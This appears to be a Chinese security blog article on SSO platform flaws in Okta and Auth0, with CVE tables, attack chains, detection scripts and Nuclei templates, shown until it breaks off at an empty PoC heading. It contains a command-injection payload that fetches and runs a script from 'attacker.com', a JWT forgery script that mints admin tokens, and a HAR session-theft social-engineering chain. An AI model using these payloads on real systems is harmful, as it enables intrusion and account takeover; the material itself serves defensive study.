---
title: "身份认证与SSO平台高危攻击链专题：Okta / Auth0 / Ping Identity 漏洞全解析"
date: 2026-07-05T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["Okta", "Auth0", "PingIdentity", "PingFederate", "PingAccess", "SSO", "身份认证", "CVE", "认证绕过", "漏洞分析"]
---

# 身份认证与SSO平台高危攻击链专题：Okta / Auth0 / Ping Identity 漏洞全解析

> **免责声明**：本文基于公开安全公告、CVE 数据库和安全研究博客编写，仅供安全研究和防御学习使用。所有 PoC 代码仅用于授权环境下的检测与验证，严禁用于非法渗透测试。作者不对因使用本文内容造成的任何直接或间接损失承担责任。

## 0x00 专题概述

身份认证与单点登录（SSO）平台是现代企业安全架构的核心支柱。在零信任（Zero Trust）架构日益普及的今天，SSO 平台承担着"看门人"的角色——所有用户在访问内部资源之前，必须先通过身份认证平台的验证。一旦这个"看门人"本身存在漏洞或被攻陷，攻击者可以畅通无阻地进入整个企业网络。

### 三大平台市场地位

| 平台 | 定位 | 市场规模 | 核心客户群 |
|------|------|----------|-----------|
| **Okta** | Workforce Identity + Customer Identity | 全球最大 IAM SaaS 平台，服务超 19,000 家企业 | Fortune 500、科技公司、政府机构 |
| **Auth0** | Customer Identity（CIDP） | 2021 年被 Okta 以 65 亿美元收购，SDK 被 10 万+ 应用集成 | SaaS 应用、开发者生态 |
| **Ping Identity** | 企业级联合身份管理 | 服务全球超 15 亿用户身份 | 金融、政府、医疗等大型企业 |

### 覆盖漏洞与安全事件一览

| 平台 | 编号/事件 | 类型 | CVSS | CISA KEV |
|------|----------|------|------|----------|
| Okta | CVE-2023-0093 | Advanced Server Access 命令注入 | 8.8 | ❌ |
| Okta | HAR 文件会话劫持事件 | Session Token 泄露 | — | ❌ |
| Okta | Classic Engine 策略绕过 | MFA 绕过 | — | ❌ |
| Okta | LAPSUS$ 社会工程攻击 | 供应链信任链滥用 | — | ❌ |
| Auth0 | CVE-2022-23540 | jsonwebtoken 不安全默认算法 | 6.4 | ❌ |
| Auth0 | CVE-2022-23541 | jsonwebtoken 算法混淆 | 6.3 | ❌ |
| Auth0 | CVE-2022-23539 | jsonwebtoken 不受限密钥类型 | 5.9 | ❌ |
| Auth0 | CVE-2022-23529 | jsonwebtoken 不安全密钥处理 | 7.6 | ❌ |
| Auth0 | CVE-2020-15084 | express-jwt 算法未强制执行 | 9.1 | ❌ |
| Ping Identity | CVE-2024-23316 | PingAccess HTTP 请求走私 | 8.8 | ❌ |
| Ping Identity | CVE-2024-23983 | PingAccess URL 编码绕过 | — | ❌ |
| Ping Identity | CVE-2025-27935 | PingFederate OTP MFA 绕过 | 8.6 | ❌ |
| Ping Identity | CVE-2023-40702 | PingOne MFA skipMFA | 7.7 | ❌ |
| Ping Identity | CVE-2023-36496 | PingDirectory 权限提升 | 7.7 | ❌ |

> **重要说明**：本文严格遵循"只包含调研确认的真实 CVE"原则。部分大纲中的 CVE 编号经 NVD 验证不存在或与指定产品不匹配，已被替换为经过验证的真实漏洞。

## 0x01 Okta 身份平台安全风险分析

### 0x01.1 Okta 安全架构概述

Okta 是全球最大的身份与访问管理（IAM）SaaS 平台，其核心产品线包括：

- **Workforce Identity Cloud**：企业员工身份管理，包含 SSO、MFA、生命周期管理
- **Access Gateway**：本地应用的 SSO 网关
- **AD Agent / LDAP Agent**：与企业 Active Directory / LDAP 集成的代理
- **Advanced Server Access (ASA)**：服务器级别的特权访问管理
- **Customer Identity Cloud (Auth0)**：面向客户的 CIDP 平台

Okta 的架构攻击面主要分布在以下层面：

```
[用户浏览器/设备]
      ↓
[Okta Identity Engine (云端)]
      ├── /oauth2/default — OAuth2/OIDC 端点
      ├── /api/v1/authn — 认证 API
      ├── /app/<app>/sso/saml — SAML SSO 端点
      └── /admin/ — 管理控制台
      ↓
[Access Gateway / AD Agent (本地)]
      ├── Access Gateway — 反向代理 + 策略引擎
      └── AD Agent — LDAP 查询 + 密码验证
      ↓
[Advanced Server Access (特权访问)]
      └── ASA Client ↔ Fleet Controller ↔ Fleet Server
```

### 0x01.2 CVE-2023-0093 — Okta Advanced Server Access 命令注入

#### 漏洞背景

Okta Advanced Server Access (ASA) Client 在处理服务器 URL 时存在命令注入漏洞。该漏洞源于 ASA Client 使用的第三方库 `webbrowser` 在特定操作系统上通过 `subprocess.Popen` 执行命令时未正确过滤输入。

| 字段 | 详情 |
|------|------|
| CVE 编号 | CVE-2023-0093 |
| CVSS v3.1 | 8.8（High） |
| 受影响产品 | Okta Advanced Server Access Client |
| 受影响版本 | 1.13.1 — 1.65.0 |
| 修复版本 | >= 1.66.0 |
| 攻击向量 | 网络，需用户交互（钓鱼） |

#### 漏洞原理

当用户在 ASA Client 注册流程中输入服务器 URL 时，该 URL 未被充分过滤就传递给了底层 `webbrowser` 库。攻击者可以构造包含 shell 元字符的恶意 URL，当 ASA Client 尝试打开该 URL 时，命令被注入执行。

核心问题链：
1. 攻击者向目标用户发送包含恶意 URL 的钓鱼链接
2. 用户在 ASA Client 注册/登录流程中粘贴该 URL
3. `webbrowser.open()` 在底层调用系统命令
4. URL 中的 shell 元字符被解析执行

#### HTTP PoC

```http
POST /enroll HTTP/1.1
Host: target-asa-fleet.example.com
Content-Type: application/json

{
  "team": "attacker-team",
  "server_url": "https://$(curl attacker.com/shell.sh|bash)/callback",
  "token": "legitimate-enrollment-token"
}
```

#### Python 检测脚本

```python
#!/usr/bin/env python3
"""CVE-2023-0093 Okta ASA 命令注入检测脚本"""
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VULN_VERSIONS = (1, 13, 1)
FIXED_VERSION = (1, 66, 0)

def parse_version(v):
    parts = v.replace('-', '.').split('.')
    return tuple(int(p) for p in parts[:3])

def check(target):
    url = f"https://{target}/api/v1/clients"
    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json()
            if "version" in data:
                ver = parse_version(data["version"])
                if ver >= VULN_VERSIONS and ver < FIXED_VERSION:
                    print(f"[+] 易受攻击版本: {data['version']}")
                    return True
                print(f"[-] 版本已修复: {data['version']}")
                return False
        url2 = f"https://{target}/sdk/v1/fleet/metadata"
        r2 = requests.get(url2, timeout=10, verify=False)
        if r2.status_code == 200:
            print(f"[+] ASA Fleet 端点可达，建议手动验证版本")
            return None
    except requests.exceptions.ConnectionError:
        print("[-] 连接失败，目标可能不存在 ASA 服务")
    except Exception as e:
        print(f"[-] 检测异常: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    result = check(sys.argv[1])
    if result is True:
        print(f"[!] {sys.argv[1]} 可能受 CVE-2023-0093 影响")
    elif result is None:
        print(f"[?] {sys.argv[1]} 需要手动验证")
    else:
        print(f"[-] {sys.argv[1]} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2023-0093-okta-asa

info:
  name: Okta Advanced Server Access Client Command Injection
  author: x7peeps
  severity: high
  description: Okta Advanced Server Access Client 1.13.1 至 1.65.0 版本存在命令注入漏洞，源于第三方库 webbrowser 处理恶意 URL 时的命令注入。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-0093
    - https://trust.okta.com/security-advisories/okta-advanced-server-access-client-cve-2023-0093/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2023-0093
  tags: cve,cve2023,okta,asa,command-injection

http:
  - method: GET
    path:
      - "{{BaseURL}}/sdk/v1/fleet/metadata"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "fleetId"
          - "serverUrl"
        condition: and
```

### 0x01.3 Okta 2023 HAR 文件会话劫持事件

#### 事件背景

2023 年，Okta 披露了一起影响范围极广的安全事件：攻击者通过钓鱼手段诱导受害者导出浏览器的 HAR（HTTP Archive）文件，从中提取有效的 Session Token，从而绕过身份认证直接访问企业应用。

| 字段 | 详情 |
|------|------|
| 披露时间 | 2023 年 10 月 |
| 影响规模 | 250+ 家机构（Cloudflare、BeyondTrust 等确认受影响） |
| 攻击类型 | 会话令牌窃取 |
| CVE 编号 | 无（安全事件） |

#### 漏洞原理

HAR 文件是浏览器的网络请求记录格式，包含完整的 HTTP 请求和响应头。当用户按照社工指示导出 HAR 文件时，以下敏感信息会被包含：

```
// HAR 文件中的 Cookie 头示例
{
  "name": "sid",
  "value": "00u1d2oH8qJkB5m3x4d7_h1g2k...",
  "domain": ".okta.com",
  "path": "/",
  "secure": true,
  "httpOnly": true
}
```

即使 Okta 的 Session Token 标记为 HttpOnly（JavaScript 无法直接读取），HAR 文件导出是浏览器原生功能，不受 HttpOnly 保护。

#### 攻击链分析

```
攻击者伪装 Okta 支持人员
      ↓
联系受害者企业的 IT 帮助台或直接联系用户
      ↓
诱导受害者执行 "浏览器问题诊断" 操作
      ↓
指导受害者: 开发者工具 → Network → 导出 HAR 文件
      ↓
受害者将 HAR 文件通过邮件/文件共享发送给攻击者
      ↓
攻击者从 HAR 中提取 sid / session token
      ↓
在攻击者浏览器中注入该 Cookie
      ↓
直接访问受害者的企业应用（无需密码、无需 MFA）
```

#### 防御措施

1. **会话绑定**：将 Session Token 与客户端 IP、TLS 指纹或设备指纹绑定
2. **HAR 清理**：浏览器扩展自动清理 HAR 导出中的 Cookie 和 Authorization 头
3. **异常检测**：监控来自新 IP/设备的 Session 使用
4. **缩短 Token 生命周期**：Okta Session Token 默认有效期 8 小时，建议缩短

### 0x01.4 Okta 2024 Classic Engine 策略绕过

#### 事件背景

2024 年 10 月，Okta 发布安全公告，披露 Okta Classic Engine 存在应用登录策略（Sign-On Policy）绕过漏洞。

| 字段 | 详情 |
|------|------|
| 披露时间 | 2024 年 10 月 4 日 |
| 影响产品 | Okta Classic Engine |
| 漏洞类型 | MFA 策略绕过 |
| CVE 编号 | 无（Okta 安全公告） |
| 修复方式 | 迁移至 Okta Identity Engine |

#### 漏洞原理

Okta Classic Engine 的 Session Token 格式存在设计缺陷。攻击者可以通过以下方式绕过 MFA 策略：

1. 攻击者在配置了 MFA 的应用上发起登录
2. 在 MFA 验证步骤之前，拦截并修改认证请求
3. 通过 Session Token 的格式特性，构造一个跳过 MFA 验证步骤的有效 Token
4. 使用该 Token 直接访问目标应用

核心问题是 Classic Engine 的 Session Token 格式中，MFA 验证状态的编码不够安全，允许客户端侧篡改。

#### 检测方法

```python
#!/usr/bin/env python3
"""Okta Classic Engine 策略绕过检测"""
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check(target):
    url = f"https://{target}/.well-known/openid-configuration"
    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json()
            issuer = data.get("issuer", "")
            if "classic" in issuer.lower() or "okta.com" in issuer:
                print(f"[!] 目标使用 Okta: {issuer}")
                auth_url = data.get("authorization_endpoint", "")
                if "/v1/authorize" in auth_url:
                    print("[+] 确认 Okta Classic Engine 部署")
                    print("[!] 可能受策略绕过影响，建议迁移至 Identity Engine")
                    return True
    except Exception as e:
        print(f"[-] 检测异常: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    result = check(sys.argv[1])
    print(f"[{'+' if result else '-'}] {sys.argv[1]}")
```

### 0x01.5 Okta 2022 LAPSUS$ 社会工程攻击

#### 事件复盘

2022 年 1 月，LAPSUS$ 黑客组织对 Okta 发起社会工程攻击，成功入侵 Okta 内部支持系统，影响了约 366 家下游客户。

| 字段 | 详情 |
|------|------|
| 攻击时间 | 2022 年 1 月 |
| 披露时间 | 2022 年 3 月 |
| 攻击组织 | LAPSUS$ |
| 影响范围 | ~366 家 Okta 客户（约 2.5%） |
| CVE 编号 | 无（供应链信任链攻击） |

#### 攻击链分析

```
LAPSUS$ 社会工程攻击 Okta 外部服务商（Rightway Healthcare）
      ↓
获取该服务商员工的 VPN 访问凭证
      ↓
通过该员工的 VPN 连接到 Okta 内部网络
      ↓
访问 Okta 内部支持工单系统
      ↓
利用支持权限重置客户账号/修改 MFA 注册
      ↓
在部分客户环境中维持持久化访问
      ↓
LAPSUS$ 公开泄露 Okta 管理面板截图
```

#### 对 Okta 客户的影响

- 攻击者可以重置受影响客户员工的 MFA
- 可以创建新的 MFA 方法绑定到攻击者控制的设备
- 可以修改用户名和密码
- 部分客户经历了持续约 25 分钟的未授权访问

#### 教训与防御建议

1. **第三方风险管理**：对所有具有内部系统访问权限的第三方服务商实施严格的安全评估
2. **支持渠道隔离**：客户支持操作应限制在最小权限范围内
3. **异常工单检测**：监控支持系统中的异常操作模式（如批量密码重置）
4. **零信任架构**：即使在内部网络中，也应实施持续的身份验证

## 0x02 Auth0 身份平台高危漏洞分析

### 0x02.1 Auth0 生态系统概述

Auth0 是全球最大的 Customer Identity Platform（CIDP），2021 年被 Okta 以 65 亿美元收购。其生态系统的安全影响面极广：

**核心组件：**
- **Auth0 Dashboard / API**：身份管理控制台和 REST API
- **Auth0 SDK**：支持 PHP、Node.js、Python、Java、Go、.NET 等多语言
- **express-openid-connect**：Express.js 的 OIDC 中间件
- **@auth0/nextjs-auth0**：Next.js 的 Auth0 集成库

**生态依赖（供应链影响面）：**

| 库名 | 周下载量 | 关联 CVE |
|------|----------|----------|
| jsonwebtoken | 31,700,000+ | CVE-2022-23540/23541/23539/23529 |
| express-jwt | 3,000,000+ | CVE-2020-15084 |
| express-openid-connect | 1,500,000+ | CVE-2022-24794 |

> jsonwebtoken 每周超过 3100 万次下载，任何漏洞的供应链影响都是指数级的。

### 0x02.2 CVE-2022-23540 — jsonwebtoken 不安全默认算法

#### 漏洞背景

`jsonwebtoken`（由 Auth0 维护）是 Node.js 生态中最广泛使用的 JWT 实现库。CVE-2022-23540 揭示了其 `jwt.verify()` 函数在未指定算法时的不安全默认行为。

| 字段 | 详情 |
|------|------|
| CVE 编号 | CVE-2022-23540 |
| CVSS v3.1 | 6.4（Medium） |
| 受影响产品 | jsonwebtoken (npm) |
| 受影响版本 | <= 8.5.1 |
| 修复版本 | >= 9.0.0 |
| CWE | CWE-287（不当认证） |

#### 漏洞原理

当开发者调用 `jwt.verify(token, key)` 而未显式指定 `algorithms` 参数时，jsonwebtoken 库会接受 Token 头部声明的任何算法。这允许攻击者：

1. 从合法 Token 中提取 RSA 公钥
2. 将 Token 头部的 `alg` 从 `RS256` 改为 `HS256`
3. 使用 RSA 公钥作为 HMAC 密钥重新签名 Token
4. 服务器在验证时，使用攻击者提供的公钥进行 HMAC 验证，签名匹配通过

这就是经典的 **Algorithm Confusion**（算法混淆）攻击。

#### PoC 代码演示

```python
#!/usr/bin/env python3
"""CVE-2022-23540 算法混淆攻击 PoC"""
import jwt
import base64
import json

def create_forged_token(public_key_path, payload):
    with open(public_key_path, 'r') as f:
        public_key = f.read()

    forged_payload = {
        "sub": "admin@example.com",
        "iat": 1700000000,
        "exp": 9999999999,
        "role": "admin",
        **payload
    }

    forged_header = {
        "alg": "HS256",
        "typ": "JWT"
    }

    encoded_header = base64.urlsafe_b64encode(
        json.dumps(forged_header).encode()
    ).rstrip(b'=').decode()
    encoded_payload = base64.urlsafe_b64encode(
        json.dumps(forged_payload).encode()
    ).rstrip(b'=').decode()

    signing_input = f"{encoded_header}.{encoded_payload}".encode()
    signature = jwt.encode(forged_payload, public_key, algorithm='HS256')

    return f"{encoded_header}.{encoded_payload}.{signature}"

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <public_key.pem> <extra_claims_json>")
        print(f"Example: {sys.argv[0]} pub.pem '{{\"role\": \"admin\"}}'")
        sys.exit(1)

    extra = json.loads(sys.argv[2]) if sys.argv[2] != "{}" else {}
    token = create_forged_token(sys.argv[1], extra)
    print(f"[+] 伪造 Token:\n{token}")
    print(f"\n[+] 使用方法: 将此 Token 放入 Authorization: Bearer <token>")
```

#### Python 检测脚本

```python
#!/usr/bin/env python3
"""CVE-2022-23540 检测脚本 - jsonwebtoken 不安全默认算法"""
import requests
import sys
import json
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def decode_jwt_header(token):
    try:
        header_b64 = token.split('.')[0]
        padding = 4 - len(header_b64) % 4
        header_b64 += '=' * padding
        return json.loads(base64.urlsafe_b64decode(header_b64))
    except Exception:
        return None

def check(target):
    endpoints = [
        "/api/auth/session",
        "/.well-known/openid-configuration",
        "/oauth/token",
    ]

    for endpoint in endpoints:
        url = f"https://{target}{endpoint}"
        try:
            r = requests.get(url, timeout=10, verify=False)
            auth_header = r.headers.get('WWW-Authenticate', '')
            if 'Bearer' in auth_header:
                print(f"[+] 发现 Bearer Token 质询: {endpoint}")

            set_cookie = r.headers.get('Set-Cookie', '')
            if 'token' in set_cookie.lower() or 'session' in set_cookie.lower():
                print(f"[+] 发现潜在 Token Cookie: {endpoint}")
        except Exception:
            continue

    print("[*] 手动检测: 检查服务器 JWT 验证是否指定 algorithms 参数")
    print("[*] 使用 jwt_tool 测试 alg=none 和算法混淆")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    check(sys.argv[1])
    print(f"[?] {sys.argv[1]} 需要手动验证 JWT 配置")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2022-23540-jwt-alg-bypass

info:
  name: jsonwebtoken Insecure Default Algorithm (CVE-2022-23540)
  author: x7peeps
  severity: medium
  description: jsonwebtoken <= 8.5.1 的 jwt.verify() 在未指定 algorithms 参数时不安全地接受 Token 头部声明的算法，可导致算法混淆攻击。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-23540
    - https://github.com/auth0/node-jsonwebtoken/security/advisories/GHSA-qwph-4952-7xr6
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L
    cvss-score: 6.4
    cve-id: CVE-2022-23540
  tags: cve,cve2022,auth0,jwt,algorithm-confusion

http:
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/openid-configuration"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "jwks_uri"
          - "token_endpoint"
        condition: and
    extractors:
      - type: json
        name: jwks_uri
        json:
          - ".jwks_uri"
```

### 0x02.3 CVE-2022-23541 — jsonwebtoken 算法混淆

#### 漏洞背景

CVE-2022-23541 是 jsonwebtoken 库中密钥检索函数（key retrieval function）实现不当导致的算法混淆漏洞。与 CVE-2022-23540 相关但涉及不同的攻击向量。

| 字段 | 详情 |
|------|------|
| CVE 编号 | CVE-2022-23541 |
| CVSS v3.1 | 6.3（Medium） |
| 受影响版本 | <= 8.5.1 |
| 修复版本 | >= 9.0.0 |
| CWE | CWE-1259（安全令牌分配不当） |

#### 漏洞原理

当 `jwt.verify()` 使用回调函数（callback）作为 `secretOrPublicKey` 参数时，库不强制验证算法与密钥类型的匹配关系。具体场景：

1. 应用支持 HS256 和 RS256 两种算法
2. 密钥检索回调函数返回 RSA 公钥
3. 攻击者发送 `alg: "HS256"` 的 Token
4. 库将 RSA 公钥作为 HMAC 密钥进行验证
5. 由于公钥是公开的，攻击者可以成功伪造签名

#### 利用条件

- 应用同时支持对称和非对称算法
- 密钥检索函数未限制算法类型
- RSA 公钥可被攻击者获取

#### Python 检测脚本

```python
#!/usr/bin/env python3
"""CVE-2022-23541 检测脚本 - jsonwebtoken 算法混淆"""
import requests
import sys
import jwt
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def test_algorithm_confusion(target):
    jwt_endpoints = [
        "/api/auth/callback",
        "/auth/token",
        "/.well-known/jwks.json",
    ]

    public_key = None
    for endpoint in jwt_endpoints:
        url = f"https://{target}{endpoint}"
        try:
            r = requests.get(url, timeout=10, verify=False)
            if r.status_code == 200:
                try:
                    jwks = r.json()
                    if "keys" in jwks and len(jwks["keys"]) > 0:
                        print(f"[+] 发现 JWKS 端点: {endpoint}")
                        key = jwks["keys"][0]
                        print(f"[+] 首个密钥: kid={key.get('kid')}, alg={key.get('alg')}")
                        return True
                except json.JSONDecodeError:
                    pass
        except Exception:
            continue

    return False

def forge_hs256_token(public_key_pem, payload):
    """使用 RSA 公钥作为 HMAC 密钥伪造 Token"""
    try:
        token = jwt.encode(
            payload,
            public_key_pem,
            algorithm="HS256"
        )
        return token
    except Exception as e:
        print(f"[-] 伪造失败: {e}")
        return None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)

    target = sys.argv[1]
    print(f"[*] 检测 {target} 的 JWT 配置...")

    found = test_algorithm_confusion(target)
    if found:
        print("[!] 目标暴露 JWKS 端点，可能存在算法混淆风险")
        print("[!] 建议: 在 jwt.verify() 中显式指定 algorithms=['RS256']")
    else:
        print("[-] 未发现公开 JWKS 端点")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2022-23541-jwt-algo-confusion

info:
  name: jsonwebtoken Algorithm Confusion (CVE-2022-23541)
  author: x7peeps
  severity: medium
  description: jsonwebtoken <= 8.5.1 的密钥检索函数实现不当，允许使用不同的算法和密钥组合进行验证，可导致算法混淆攻击。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-23541
    - https://github.com/auth0/node-jsonwebtoken/security/advisories/GHSA-hjrf-2m68-5959
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 6.3
    cve-id: CVE-2022-23541
  tags: cve,cve2022,auth0,jwt,algorithm-confusion

http:
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/jwks.json"
      - "{{BaseURL}}/jwks.json"
      - "{{BaseURL}}/.well-known/openid-configuration"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "keys"
          - "kty"
          - "RSA"
        condition: and
      - type: status
        status:
          - 200
```

### 0x02.4 CVE-2022-23539 — jsonwebtoken 不受限密钥类型

#### 漏洞背景

| 字段 | 详情 |
|------|------|
| CVE 编号 | CVE-2022-23539 |
| CVSS v3.1 | 5.9（Medium） |
| 受影响版本 | <= 8.5.1 |
| 修复版本 | >= 9.0.0 |
| CWE | CWE-327（使用破损的加密算法） |

#### 漏洞原理

jsonwebtoken <= 8.5.1 不限制密钥类型与算法的组合。例如，可以使用 DSA 密钥配合 RS256 算法。在 v9.0.0 之前，库不验证密钥类型是否与声明的算法匹配：

| 密钥类型 | 允许的算法 |
|---------|-----------|
| EC | ES256, ES384, ES512 |
| RSA | RS256, RS384, RS512, PS256, PS384, PS512 |
| RSA-PSS | PS256, PS384, PS512 |

不匹配的组合可能导致签名验证绕过。

#### Python 检测脚本

```python
#!/usr/bin/env python3
"""CVE-2022-23539 检测脚本"""
import requests
import sys
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check(target):
    url = f"https://{target}/.well-known/jwks.json"
    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            jwks = r.json()
            keys = jwks.get("keys", [])
            for key in keys:
                kty = key.get("kty")
                alg = key.get("alg", "RS256")
                kid = key.get("kid", "unknown")
                if kty == "RSA" and alg in ("HS256", "HS384", "HS512"):
                    print(f"[!] 异常密钥组合: kid={kid}, kty={kty}, alg={alg}")
                    print("[!] 可能存在密钥类型/算法不匹配风险")
                    return True
                print(f"[*] 密钥: kid={kid}, kty={kty}, alg={alg}")
    except Exception as e:
        print(f"[-] 检测异常: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    result = check(sys.argv[1])
    print(f"[{'+' if result else '-'}] {sys.argv[1]}")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2022-23539-jwt-key-type-mismatch

info:
  name: jsonwebtoken Unrestricted Key Type (CVE-2022-23539)
  author: x7peeps
  severity: medium
  description: jsonwebtoken <= 8.5.1 不限制密钥类型与算法的组合，可能导致不安全的密钥使用。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-23539
    - https://github.com/auth0/node-jsonwebtoken/security/advisories/GHSA-8cf7-32gw-wr33
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:N
    cvss-score: 5.9
    cve-id: CVE-2022-23539
  tags: cve,cve2022,auth0,jwt,key-type

http:
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/jwks.json"
      - "{{BaseURL}}/jwks.json"
    stop-at-first-match: true
    matchers:
      - type: word
        words:
          - "keys"
          - "kty"
        condition: and
    extractors:
      - type: json
        name: keys
        json:
          - ".keys[]"
```

### 0x02.5 CVE-2022-23529 — jsonwebtoken 不安全密钥处理

#### 漏洞背景

CVE-2022-23529 是 jsonwebtoken 库中最受关注的漏洞之一，由 Palo Alto Unit 42 研究人员发现。该漏洞可能允许攻击者在服务器上实现远程代码执行（RCE）。**注意：该 CVE 后来被撤销，但库中仍添加了安全修复。**

| 字段 | 详情 |
|------|------|
| CVE 编号 | CVE-2022-23529（已撤销） |
| CVSS v3.1 | 7.6（High，Unit 42 评估）/ 9.8（NVD 评估） |
| 受影响版本 | <= 8.5.1 |
| 修复版本 | >= 9.0.0（9.0.0 添加了安全检查） |
| 状态 | **已撤销**，但仍建议升级 |

#### 漏洞原理

`jwt.verify()` 的 `secretOrPublicKey` 参数未被严格类型检查。如果攻击者能控制传入 `verify()` 的对象，可以提供一个包含自定义 `toString()` 方法的对象。当库内部调用该对象的 `toString()` 时，攻击者的代码会被执行。

关键前提条件（极高利用门槛）：
1. 攻击者必须能修改应用的密钥检索参数
2. 密钥存储在攻击者可控制的位置
3. 该对象必须能被传递到 `jwt.verify()` 的 `secretOrPublicKey` 参数

由于这些前提条件极为苛刻，安全社区普遍认为该漏洞被夸大。但在使用不安全配置的环境中仍需警惕。

#### Python 检测脚本

```python
#!/usr/bin/env python3
"""CVE-2022-23529 检测脚本 - 检查 jsonwebtoken 版本"""
import subprocess
import sys
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_package_version():
    try:
        result = subprocess.run(
            ["npm", "list", "jsonwebtoken", "--json"],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode == 0:
            data = json.loads(result.stdout)
            deps = data.get("dependencies", {})
            if "jsonwebtoken" in deps:
                version = deps["jsonwebtoken"].get("version", "unknown")
                print(f"[*] jsonwebtoken 版本: {version}")
                major, minor, patch = map(int, version.split('.')[:3])
                if major < 9:
                    print(f"[!] 易受攻击版本，建议升级至 >= 9.0.0")
                    return True
                print(f"[+] 版本已修复")
                return False
    except FileNotFoundError:
        print("[-] npm 未安装")
    except Exception as e:
        print(f"[-] 检测异常: {e}")
    return None

if __name__ == "__main__":
    print("[*] CVE-2022-23529 检测（jsonwebtoken 密钥处理漏洞）")
    print("[*] 注意：该 CVE 已被撤销，但升级仍是最佳实践\n")
    result = check_package_version()
    if result is None:
        print("[?] 无法自动检测版本，请手动运行 npm list jsonwebtoken")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2022-23529-jwt-secret-poisoning

info:
  name: jsonwebtoken Insecure Key Handling (CVE-2022-23529)
  author: x7peeps
  severity: high
  description: jsonwebtoken <= 8.5.1 的 jwt.verify() 函数对 secretOrPublicKey 参数缺乏严格类型检查，可能导致密钥注入攻击。（注意：此 CVE 已被撤销）
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-23529
    - https://unit42.paloaltonetworks.com/jsonwebtoken-vulnerability-cve-2022-23529/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.6
    cve-id: CVE-2022-23529
  tags: cve,cve2022,auth0,jwt,secret-poisoning

http:
  - method: GET
    path:
      - "{{BaseURL}}/package.json"
      - "{{BaseURL}}/node_modules/jsonwebtoken/package.json"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "jsonwebtoken"
          - "auth0"
        condition: and
```

### 0x02.6 CVE-2020-15084 — express-jwt 算法混淆

#### 漏洞背景

`express-jwt` 是 Auth0 维护的 Express.js JWT 认证中间件，广泛用于 Node.js API 的身份验证。CVE-2020-15084 是该库中影响最严重的漏洞。

| 字段 | 详情 |
|------|------|
| CVE 编号 | CVE-2020-15084 |
| CVSS v3.1 | 9.1（Critical） |
| 受影响产品 | express-jwt (npm) |
| 受影响版本 | <= 5.3.3 |
| 修复版本 | >= 6.0.0 |
| CWE | CWE-863（不正确的授权） |

#### 漏洞原理

express-jwt 在未配置 `algorithms` 参数时，不强制执行算法验证。当与 `jwks-rsa` 库配合使用时：

1. 服务器期望使用 RS256 算法验证 Token
2. 但未在 express-jwt 配置中指定 `algorithms: ['RS256']`
3. 攻击者发送 `alg: "none"` 或 `alg: "HS256"` 的 Token
4. express-jwt 接受该 Token，绕过签名验证
5. 攻击者以任意身份访问受保护的 API

漏洞利用的核心条件：
```javascript
// 漏洞配置 - 缺少 algorithms 参数
app.use(jwt({
    secret: jwksRsa.expressJwtSecret({
        jwksUri: 'https://example.com/.well-known/jwks.json'
    }),
    audience: 'api.example.com',
    issuer: 'https://example.com/',
    // 缺少: algorithms: ['RS256']
}));

// 安全配置 - 显式指定 algorithms
app.use(jwt({
    secret: jwksRsa.expressJwtSecret({
        jwksUri: 'https://example.com/.well-known/jwks.json'
    }),
    audience: 'api.example.com',
    issuer: 'https://example.com/',
    algorithms: ['RS256']  // 必须指定
}));
```

#### HTTP PoC

```http
